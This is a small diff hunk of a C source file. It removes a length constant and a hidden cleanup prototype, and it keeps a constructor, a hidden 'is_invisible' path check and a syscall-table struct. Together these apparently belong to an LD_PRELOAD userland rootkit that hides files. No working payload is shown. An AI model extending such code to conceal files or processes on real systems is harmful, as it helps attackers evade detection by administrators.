@@ -4,12 +4,10 @@
 
 #include "const.h"
 
-#define MAX_LEN 1024
 #define _STAT_VER 1
 
 static void init (void) __attribute__ ((constructor));
 
-void cleanup(void *var, int len) __attribute__((visibility("hidden")));
 int is_invisible(const char *path) __attribute__((visibility("hidden")));
 
 typedef struct struct_syscalls {
